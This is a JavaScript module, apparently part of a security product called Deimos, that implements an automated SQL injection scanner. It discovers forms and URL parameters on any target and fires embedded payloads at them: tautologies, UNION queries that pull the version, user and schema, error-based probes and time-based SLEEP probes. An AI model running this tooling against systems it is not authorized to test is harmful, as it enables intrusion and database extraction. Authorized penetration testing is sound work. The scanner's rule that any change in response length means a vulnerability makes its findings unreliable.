// [COMMENTO ARCHITETTO DEVSECOPS]: Implementazione completa del servizio di scansione SQLi.
// Il precedente era uno stub. Questa versione è stateful, gestisce le scansioni in background
// e implementa una logica di rilevamento reale basata su errori, tempo e differenze di contenuto.
// I payload sono stati integrati dalle note fornite.

const axios = require('axios');
const cheerio = require('cheerio');
const { v4: uuidv4 } = require('uuid');
const logger = require('../../utils/logger');
const config = require('../../config');

// Mappa per tenere traccia delle scansioni attive in memoria.
const activeScans = new Map();

// Payloads integrati dalle note fornite, strutturati per tipo.
const PAYLOADS = {
    basic: ["' OR '1'='1", "' OR 1=1 --", "admin'--"],
    union: [
        "' UNION SELECT null,@@version--",
        "' UNION SELECT version(), current_user --",
        "' UNION SELECT table_name, column_name FROM information_schema.columns --"
    ],
    error: [
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))--"
    ],
    time: [
        "' OR IF(1=1,SLEEP(5),0)--",
        "'; SELECT pg_sleep(5)--"
    ],
    boolean: [
        "' AND 1=1--",
        "' AND 1=2--"
    ]
};

// Firme di errore comuni nei body delle risposte HTTP
const ERROR_SIGNATURES = [
    /error in your SQL syntax/i, /mysql_fetch/i, /invalid input syntax for type/i,
    /ORA-009/i, /unclosed quotation mark/i, /Microsoft OLE DB Provider for SQL Server/i
];

/**
 * Funzione principale che esegue una scansione in background
 */
async function runScan(scanId) {
    const scan = activeScans.get(scanId);
    if (!scan) return;

    try {
        scan.status = 'running';
        const injectionPoints = await discoverInjectionPoints(scan.target);
        scan.stats.injectionPoints = injectionPoints.length;
        
        if (injectionPoints.length === 0) throw new Error("Nessun punto di iniezione (form o parametri URL) trovato.");

        const payloadsToTest = getPayloads(scan.options.scanType);
        scan.stats.estimatedTotal = injectionPoints.length * payloadsToTest.length;

        for (const point of injectionPoints) {
            if (scan.status !== 'running') break; // Permette la cancellazione
            const pointResult = { point, results: [] };
            
            for (const payload of payloadsToTest) {
                if (scan.status !== 'running') break;
                scan.stats.totalTests++;
                const result = await executePayloadTest(point, payload, scan.target);
                if (result.isVulnerable) scan.stats.vulnerabilitiesFound++;
                pointResult.results.push(result);
            }
            scan.results.push(pointResult);
        }

        scan.status = scan.status === 'running' ? 'completed' : 'cancelled';

    } catch (error) {
        scan.status = 'error';
        scan.error = error.message;
    } finally {
        scan.endTime = new Date();
        activeScans.set(scanId, scan);
    }
}

/**
 * Tenta di scoprire form e parametri URL in una pagina
 */
async function discoverInjectionPoints(url) {
    const points = [];
    const response = await axios.get(url, { timeout: config.sql_injection.timeout });
    const $ = cheerio.load(response.data);
    const base = new URL(url);

    // Cerca form
    $('form').each((i, form) => {
        const method = ($(form).attr('method') || 'GET').toUpperCase();
        const action = new URL($(form).attr('action') || base.pathname, base.href).href;
        const inputs = [];
        $(form).find('input[name], textarea[name]').each((j, input) => {
            inputs.push($(input).attr('name'));
        });
        if(inputs.length > 0) points.push({ type: 'form', method, action, inputs });
    });

    // Cerca parametri URL
    if (Array.from(base.searchParams.keys()).length > 0) {
        points.push({ type: 'url', method: 'GET', action: url, inputs: Array.from(base.searchParams.keys()) });
    }

    return points;
}

/**
 * Invia una richiesta HTTP con un payload di test
 */
async function makeRequest(point, inputsWithPayloads, originalUrl) {
    const options = {
        method: point.method,
        url: point.action,
        timeout: config.sql_injection.timeout + 6000, // Timeout più lungo per i test time-based
        headers: { 'User-Agent': 'DeimosSecurityScanner/1.0' }
    };
    
    if (point.method === 'POST') {
        options.data = new URLSearchParams(inputsWithPayloads).toString();
        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    } else { // GET
        const url = new URL(point.action);
        for(const key in inputsWithPayloads) {
            url.searchParams.set(key, inputsWithPayloads[key]);
        }
        options.url = url.href;
    }
    return axios(options);
}


/**
 * Testa un singolo payload e analizza la risposta
 */
async function executePayloadTest(point, payload, originalUrl) {
    const result = { payload, isVulnerable: false, proof: 'Nessuna anomalia rilevata.' };
    
    const baselineRes = await makeRequest(point, Object.fromEntries(point.inputs.map(k => [k, 'deimos_test'])), originalUrl);
    const baselineLength = baselineRes.data.length;
    
    const testPayloads = Object.fromEntries(point.inputs.map(k => [k, payload]));

    try {
        const startTime = Date.now();
        const attackRes = await makeRequest(point, testPayloads, originalUrl);
        const duration = Date.now() - startTime;
        
        // 1. Rilevamento basato su tempo
        if (duration > 4500 && duration < 10000) {
            result.isVulnerable = true;
            result.proof = `Rilevato ritardo anomalo nella risposta (${duration}ms), indicativo di Time-Based SQLi.`;
            return result;
        }

        // 2. Rilevamento basato su errore
        const responseBody = attackRes.data.toString();
        for (const signature of ERROR_SIGNATURES) {
            if (signature.test(responseBody)) {
                result.isVulnerable = true;
                result.proof = `La risposta contiene una firma di errore SQL: "${signature.source}".`;
                return result;
            }
        }
        
        // 3. Rilevamento basato su contenuto (Boolean/Union)
        if (responseBody.length !== baselineLength) {
             result.isVulnerable = true;
             result.proof = `La lunghezza della risposta (${attackRes.data.length}) è diversa da quella di baseline (${baselineLength}), indicativo di Boolean o Union-Based SQLi.`;
             return result;
        }

    } catch (error) {
       // Se anche la richiesta di attacco genera un errore HTTP, potrebbe essere un indizio
       const errorBody = error.response?.data?.toString();
       if(errorBody) {
            for (const signature of ERROR_SIGNATURES) {
                if (signature.test(errorBody)) {
                    result.isVulnerable = true;
                    result.proof = `La risposta di errore contiene una firma SQL: "${signature.source}".`;
                    return result;
                }
            }
       }
    }
    return result;
}

function getPayloads(scanType) {
    if (PAYLOADS[scanType]) return PAYLOADS[scanType];
    return Object.values(PAYLOADS).flat(); // 'full' scan
}


// --- Interfaccia pubblica del modulo ---
module.exports = {
    startScan(targetUrl, options) {
        const scanId = uuidv4();
        activeScans.set(scanId, {
            id: scanId,
            target: targetUrl,
            status: 'queued',
            options,
            startTime: new Date(),
            endTime: null,
            results: [],
            stats: { injectionPoints: 0, totalTests: 0, vulnerabilitiesFound: 0, estimatedTotal: 0 },
            error: null
        });
        // Avvia la scansione in background senza aspettare il suo completamento
        runScan(scanId);
        return { id: scanId, message: 'Scan avviata.' };
    },

    getScanStatus(scanId) {
        return activeScans.get(scanId);
    },

    cancelScan(scanId) {
        const scan = activeScans.get(scanId);
        if (scan && scan.status === 'running') {
            scan.status = 'cancelling';
            return { message: 'Cancellazione richiesta.' };
        }
        return { message: 'Scan non in esecuzione o non trovata.' };
    }
};